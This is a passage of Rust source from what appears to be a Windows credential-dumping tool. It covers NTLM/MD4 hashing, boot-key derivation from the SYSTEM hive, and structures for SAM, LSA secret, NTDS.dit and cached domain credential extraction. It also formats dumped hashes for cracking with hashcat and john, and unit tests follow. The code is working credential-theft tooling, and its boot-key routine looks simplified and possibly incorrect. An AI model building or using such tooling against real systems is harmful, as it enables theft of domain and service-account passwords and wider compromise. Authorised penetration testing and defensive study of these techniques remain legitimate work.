// ═══════════════════════════════════════════════════════════

/// Compute NTLM hash (MD4 of UTF-16LE password)
fn compute_nt_hash(password_bytes: &[u8]) -> Vec<u8> {
    // MD4 implementation (simplified — in production use a crypto crate)
    md4_hash(password_bytes)
}

/// Minimal MD4 implementation for NTLM hash computation
fn md4_hash(input: &[u8]) -> Vec<u8> {
    // MD4 constants
    let mut a: u32 = 0x67452301;
    let mut b: u32 = 0xefcdab89;
    let mut c: u32 = 0x98badcfe;
    let mut d: u32 = 0x10325476;

    // Padding
    let bit_len = (input.len() as u64) * 8;
    let mut msg = input.to_vec();
    msg.push(0x80);
    while msg.len() % 64 != 56 {
        msg.push(0);
    }
    msg.extend_from_slice(&bit_len.to_le_bytes());

    // Process each 64-byte block
    for block in msg.chunks(64) {
        let mut x = [0u32; 16];
        for (i, chunk) in block.chunks(4).enumerate() {
            if i < 16 && chunk.len() == 4 {
                x[i] = u32::from_le_bytes([chunk[0], chunk[1], chunk[2], chunk[3]]);
            }
        }

        let (aa, bb, cc, dd) = (a, b, c, d);

        // Round 1
        macro_rules! ff {
            ($a:expr, $b:expr, $c:expr, $d:expr, $k:expr, $s:expr) => {
                $a = ($a.wrapping_add(($b & $c) | (!$b & $d)).wrapping_add(x[$k])).rotate_left($s);
            };
        }
        ff!(a, b, c, d, 0, 3);  ff!(d, a, b, c, 1, 7);  ff!(c, d, a, b, 2, 11); ff!(b, c, d, a, 3, 19);
        ff!(a, b, c, d, 4, 3);  ff!(d, a, b, c, 5, 7);  ff!(c, d, a, b, 6, 11); ff!(b, c, d, a, 7, 19);
        ff!(a, b, c, d, 8, 3);  ff!(d, a, b, c, 9, 7);  ff!(c, d, a, b, 10, 11); ff!(b, c, d, a, 11, 19);
        ff!(a, b, c, d, 12, 3); ff!(d, a, b, c, 13, 7); ff!(c, d, a, b, 14, 11); ff!(b, c, d, a, 15, 19);

        // Round 2
        macro_rules! gg {
            ($a:expr, $b:expr, $c:expr, $d:expr, $k:expr, $s:expr) => {
                $a = ($a.wrapping_add(($b & $c) | ($b & $d) | ($c & $d)).wrapping_add(x[$k]).wrapping_add(0x5A827999)).rotate_left($s);
            };
        }
        gg!(a, b, c, d, 0, 3);  gg!(d, a, b, c, 4, 5);  gg!(c, d, a, b, 8, 9);  gg!(b, c, d, a, 12, 13);
        gg!(a, b, c, d, 1, 3);  gg!(d, a, b, c, 5, 5);  gg!(c, d, a, b, 9, 9);  gg!(b, c, d, a, 13, 13);
        gg!(a, b, c, d, 2, 3);  gg!(d, a, b, c, 6, 5);  gg!(c, d, a, b, 10, 9); gg!(b, c, d, a, 14, 13);
        gg!(a, b, c, d, 3, 3);  gg!(d, a, b, c, 7, 5);  gg!(c, d, a, b, 11, 9); gg!(b, c, d, a, 15, 13);

        // Round 3
        macro_rules! hh {
            ($a:expr, $b:expr, $c:expr, $d:expr, $k:expr, $s:expr) => {
                $a = ($a.wrapping_add($b ^ $c ^ $d).wrapping_add(x[$k]).wrapping_add(0x6ED9EBA1)).rotate_left($s);
            };
        }
        hh!(a, b, c, d, 0, 3);  hh!(d, a, b, c, 8, 9);  hh!(c, d, a, b, 4, 11); hh!(b, c, d, a, 12, 15);
        hh!(a, b, c, d, 2, 3);  hh!(d, a, b, c, 10, 9); hh!(c, d, a, b, 6, 11); hh!(b, c, d, a, 14, 15);
        hh!(a, b, c, d, 1, 3);  hh!(d, a, b, c, 9, 9);  hh!(c, d, a, b, 5, 11); hh!(b, c, d, a, 13, 15);
        hh!(a, b, c, d, 3, 3);  hh!(d, a, b, c, 11, 9); hh!(c, d, a, b, 7, 11); hh!(b, c, d, a, 15, 15);

        a = a.wrapping_add(aa);
        b = b.wrapping_add(bb);
        c = c.wrapping_add(cc);
        d = d.wrapping_add(dd);
    }

    let mut result = Vec::with_capacity(16);
    result.extend_from_slice(&a.to_le_bytes());
    result.extend_from_slice(&b.to_le_bytes());
    result.extend_from_slice(&c.to_le_bytes());
    result.extend_from_slice(&d.to_le_bytes());
    result
}

/// Decode UTF-16LE bytes to a String
fn decode_utf16le(data: &[u8]) -> String {
    let u16s: Vec<u16> = data
        .chunks(2)
        .filter_map(|chunk| {
            if chunk.len() == 2 {
                Some(u16::from_le_bytes([chunk[0], chunk[1]]))
            } else {
                None
            }
        })
        .collect();
    String::from_utf16_lossy(&u16s)
        .trim_end_matches('\0')
        .to_string()
}

// ═══════════════════════════════════════════════════════════
//  Legacy Types (kept for backward compatibility)
// ═══════════════════════════════════════════════════════════

/// Credential types that can be extracted
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum SecretCategory {
    /// SAM database — local account NTLM hashes
    Sam,
    /// LSA secrets — service account credentials, DPAPI keys
    Lsa,
    /// NTDS.dit — all domain account hashes via DRSUAPI
    Ntds,
    /// Domain Cached Credentials v2 (mscash2)
    CachedDomain,
}

/// A single extracted credential (legacy struct with `account` field)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExtractedSecret {
    pub secret_type: SecretCategory,
    /// Domain\Username or machine account
    pub account: String,
    /// RID (Relative Identifier) if applicable
    pub rid: Option<u32>,
    /// LM hash (usually empty/disabled on modern systems)
    pub lm_hash: Option<String>,
    /// NTLM hash
    pub nt_hash: Option<String>,
    /// Plaintext password (from LSA secrets or reversible encryption)
    pub plaintext: Option<String>,
    /// Raw secret data for non-password secrets
    pub raw_data: Option<Vec<u8>>,
    /// Additional metadata
    pub metadata: HashMap<String, String>,
}

/// Options controlling what to extract
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DumpOptions {
    pub dump_sam: bool,
    pub dump_lsa: bool,
    pub dump_ntds: bool,
    pub dump_cached: bool,
    pub target_users: Vec<String>,
    pub use_vss: bool,
    pub replication_threads: u32,
    pub include_machine_accounts: bool,
    pub include_history: bool,
}

impl Default for DumpOptions {
    fn default() -> Self {
        Self {
            dump_sam: true,
            dump_lsa: true,
            dump_ntds: true,
            dump_cached: true,
            target_users: Vec::new(),
            use_vss: false,
            replication_threads: 4,
            include_machine_accounts: false,
            include_history: false,
        }
    }
}

/// Result of a secrets extraction operation
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DumpResult {
    pub target_host: String,
    pub secrets: Vec<ExtractedSecret>,
    pub sam_count: usize,
    pub lsa_count: usize,
    pub ntds_count: usize,
    pub cached_count: usize,
    pub errors: Vec<String>,
}

// ═══════════════════════════════════════════════════════════
//  Utility Functions
// ═══════════════════════════════════════════════════════════

/// Boot key (SysKey) extracted from the SYSTEM registry hive
#[derive(Debug, Clone)]
pub struct BootKey {
    pub key: [u8; 16],
}

impl BootKey {
    /// Derive the boot key from SYSTEM hive JD/Skew1/GBG/Data class values
    pub fn from_system_hive(jd: &[u8], skew1: &[u8], gbg: &[u8], data: &[u8]) -> Result<Self> {
        if jd.len() < 2 || skew1.len() < 2 || gbg.len() < 2 || data.len() < 2 {
            return Err(anyhow!("Invalid SYSTEM hive class data for boot key derivation"));
        }

        let mut scrambled = Vec::with_capacity(16);
        for src in &[jd, skew1, gbg, data] {
            scrambled.extend_from_slice(&src[..std::cmp::min(4, src.len())]);
        }
        scrambled.resize(16, 0);

        const PERM: [usize; 16] = [
            0x8, 0x5, 0x4, 0x2, 0xB, 0x9, 0xD, 0x3,
            0x0, 0x6, 0x1, 0xC, 0xE, 0xA, 0xF, 0x7,
        ];

        let mut key = [0u8; 16];
        for (i, &p) in PERM.iter().enumerate() {
            if p < scrambled.len() {
                key[i] = scrambled[p];
            }
        }

        Ok(Self { key })
    }
}

/// Parse a SAM entry into an ExtractedSecret
pub fn parse_sam_hash(account: &str, rid: u32, lm_bytes: &[u8], nt_bytes: &[u8]) -> ExtractedSecret {
    let lm_hash = if lm_bytes.iter().all(|&b| b == 0) {
        None
    } else {
        Some(hex_encode(lm_bytes))
    };

    let nt_hash = if nt_bytes.iter().all(|&b| b == 0) {
        None
    } else {
        Some(hex_encode(nt_bytes))
    };

    ExtractedSecret {
        secret_type: SecretCategory::Sam,
        account: account.to_string(),
        rid: Some(rid),
        lm_hash,
        nt_hash,
        plaintext: None,
        raw_data: None,
        metadata: HashMap::new(),
    }
}

/// Known LSA secret prefixes and their meanings
pub fn classify_lsa_secret(name: &str) -> &'static str {
    if name.starts_with("_SC_") {
        "Service Account Password"
    } else if name.starts_with("NL$KM") {
        "NL$KM — Cached Credentials Encryption Key"
    } else if name.starts_with("DPAPI") {
        "DPAPI Master Key Backup"
    } else if name.starts_with("$MACHINE.ACC") {
        "Machine Account Password"
    } else if name.starts_with("DefaultPassword") {
        "Auto-Logon Default Password"
    } else if name.starts_with("aspnet_WP_PASSWORD") {
        "ASP.NET Worker Process Password"
    } else {
        "Unknown LSA Secret"
    }
}

/// Format an NTDS hash entry: `domain\user:rid:lm_hash:nt_hash:::`
pub fn format_ntds_hash(domain: &str, secret: &ExtractedSecret) -> String {
    let lm = secret.lm_hash.as_deref().unwrap_or("aad3b435b51404eeaad3b435b51404ee");
    let nt = secret.nt_hash.as_deref().unwrap_or("31d6cfe0d16ae931b73c59d7e0c089c0");
    let rid = secret.rid.unwrap_or(0);
    format!("{}\\{}:{}:{}:{}:::", domain, secret.account, rid, lm, nt)
}

/// Format output compatible with hashcat (-m 1000) and john
pub fn format_for_cracking(secrets: &[ExtractedSecret]) -> Vec<String> {
    secrets
        .iter()
        .filter_map(|s| {
            s.nt_hash
                .as_ref()
                .map(|nt| format!("{}:{}", s.account, nt))
        })
        .collect()
}

/// Format cached domain credential for hashcat (-m 2100)
pub fn format_dcc2_for_cracking(username: &str, dcc2_hash: &[u8]) -> String {
    format!("$DCC2$10240#{}#{}", username, hex_encode(dcc2_hash))
}

// ═══════════════════════════════════════════════════════════
//  Tests
// ═══════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_hex_encode() {
        assert_eq!(hex_encode(&[0xAA, 0xBB, 0xCC]), "aabbcc");
        assert_eq!(hex_encode(&[]), "");
        assert_eq!(hex_encode(&[0x00, 0xFF]), "00ff");
    }

    #[test]
    fn test_sam_hash_parse() {
        let lm = [0u8; 16];
        let nt = [0xAA; 16];
        let secret = parse_sam_hash("Administrator", 500, &lm, &nt);

        assert_eq!(secret.account, "Administrator");
        assert_eq!(secret.rid, Some(500));
        assert!(secret.lm_hash.is_none());
        assert!(secret.nt_hash.is_some());
    }

    #[test]
    fn test_ntds_hash_format() {
        let secret = ExtractedSecret {
            secret_type: SecretCategory::Ntds,
            account: "jdoe".to_string(),
            rid: Some(1104),
            lm_hash: None,
            nt_hash: Some("fc525c9683e8fe067095ba2ddc971889".to_string()),
            plaintext: None,
            raw_data: None,
            metadata: HashMap::new(),
        };

        let formatted = format_ntds_hash("CORP", &secret);
        assert!(formatted.starts_with("CORP\\jdoe:1104:"));
        assert!(formatted.contains("fc525c9683e8fe067095ba2ddc971889"));
    }

    #[test]
    fn test_lsa_secret_classification() {
        assert_eq!(classify_lsa_secret("_SC_SqlService"), "Service Account Password");
        assert_eq!(classify_lsa_secret("$MACHINE.ACC"), "Machine Account Password");
        assert_eq!(classify_lsa_secret("NL$KM"), "NL$KM — Cached Credentials Encryption Key");
        assert_eq!(classify_lsa_secret("RandomThing"), "Unknown LSA Secret");
    }

    #[test]
    fn test_dcc2_format() {
        let hash = [0xBB; 16];
        let formatted = format_dcc2_for_cracking("admin", &hash);
        assert!(formatted.starts_with("$DCC2$10240#admin#"));
    }

    #[test]
    fn test_dump_options_default() {
        let opts = DumpOptions::default();
        assert!(opts.dump_sam);
        assert!(opts.dump_ntds);
        assert_eq!(opts.replication_threads, 4);
        assert!(!opts.use_vss);
    }

    #[test]
    fn test_cracking_format() {
        let secrets = vec![ExtractedSecret {
            secret_type: SecretCategory::Ntds,
            account: "admin".to_string(),
            rid: Some(500),
            lm_hash: None,
            nt_hash: Some("aabbccdd".to_string()),
            plaintext: None,
            raw_data: None,
            metadata: HashMap::new(),
        }];
        let lines = format_for_cracking(&secrets);
        assert_eq!(lines.len(), 1);
        assert_eq!(lines[0], "admin:aabbccdd");
    }

    #[test]
    fn test_md4_empty() {
        let hash = md4_hash(b"");
        assert_eq!(hex_encode(&hash), "31d6cfe0d16ae931b73c59d7e0c089c0");
    }

    #[test]
    fn test_decode_utf16le() {
        let data = b"A\x00d\x00m\x00i\x00n\x00";
        assert_eq!(decode_utf16le(data), "Admin");
    }

    #[test]
    fn test_validate_hive_too_small() {
        assert!(validate_hive(&[0u8; 100], "TEST").is_err());
    }

    #[test]
    fn test_validate_hive_bad_magic() {
        let mut data = vec![0u8; 5000];
        data[0..4].copy_from_slice(b"NOPE");
        assert!(validate_hive(&data, "TEST").is_err());
    }

    #[test]
    fn test_validate_hive_good() {
        let mut data = vec![0u8; 5000];
        data[0..4].copy_from_slice(b"regf");
        assert!(validate_hive(&data, "TEST").is_ok());
    }

    #[test]
    fn test_hex_str_to_bytes() {
        assert_eq!(hex_str_to_bytes("aabb").unwrap(), vec![0xAA, 0xBB]);
        assert!(hex_str_to_bytes("abc").is_err()); // odd length
    }

    #[test]
    fn test_sam_credential_struct() {
        let cred = SamCredential {
            username: "admin".to_string(),
            rid: Some(500),
            lm_hash: None,
            nt_hash: Some("aabbccdd".to_string()),
        };
        assert_eq!(cred.username, "admin");
        assert_eq!(cred.rid.unwrap(), 500);
        assert_eq!(cred.nt_hash.as_deref().unwrap(), "aabbccdd");
    }

    #[test]
    fn test_lsa_credential_struct() {
        let cred = LsaCredential {
            username: "_SC_SqlSvc".to_string(),
            nt_hash: Some("11223344".to_string()),
            plaintext: Some("Password123".to_string()),
        };
        assert_eq!(cred.plaintext.as_ref().map(|p| p.len()).unwrap(), 11);
    }

    #[test]
    fn test_dcc2_credential_struct() {
        let cred = Dcc2Credential {
            username: "admin".to_string(),
            nt_hash: Some("$DCC2$10240#admin#aabbccdd".to_string()),
        };
        assert!(cred.nt_hash.as_ref().unwrap().starts_with("$DCC2$"));
    }
}
